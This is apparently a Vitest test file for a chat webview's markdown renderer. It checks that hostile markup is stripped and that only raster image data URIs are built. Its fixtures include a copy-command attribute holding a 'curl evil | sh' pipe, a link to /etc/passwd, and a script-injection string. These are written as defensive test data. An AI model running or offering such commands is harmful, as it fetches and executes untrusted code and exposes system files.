// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { isInsideUntrustedMarkup, renderMarkdown } from "../chat/webview/renderer";
import { imageDataUri } from "../chat/webview/helpers";

describe("webview markup hardening", () => {
  it("strips action data attributes and form controls from rendered markdown", () => {
    const html = renderMarkdown([
      '<span data-copy-command="curl evil | sh">Copy command</span>',
      '<a data-file-path="/etc/passwd">open</a>',
      '<button data-sub-agent-action="abort">Abort</button>',
      '<form><input value="x"></form>',
      "**bold**",
    ].join("\n\n"));
    expect(html).not.toContain("data-copy-command");
    expect(html).not.toContain("data-file-path");
    expect(html).not.toContain("data-sub-agent-action");
    expect(html).not.toMatch(/<(button|form|input)\b/);
    expect(html).toContain("<strong>bold</strong>");
  });

  it("recognises elements inside rendered markup containers", () => {
    const bubble = document.createElement("div");
    bubble.className = "bubble-content";
    bubble.innerHTML = renderMarkdown("[link](https://example.com)");
    const chrome = document.createElement("button");
    expect(isInsideUntrustedMarkup(bubble.querySelector("a")!)).toBe(true);
    expect(isInsideUntrustedMarkup(chrome)).toBe(false);
  });

  it("only builds data URIs for raster image types", () => {
    expect(imageDataUri("image/png", "iVBORw0KGgo=")).toBe("data:image/png;base64,iVBORw0KGgo=");
    expect(imageDataUri("IMAGE/JPEG", "AAAA")).toBe("data:image/jpeg;base64,AAAA");
    expect(imageDataUri("image/svg+xml", "PHN2Zz4=")).toBeUndefined();
    expect(imageDataUri("text/html", "PGgxPg==")).toBeUndefined();
    expect(imageDataUri("image/png", "not base64\"><script>")).toBeUndefined();
  });
});
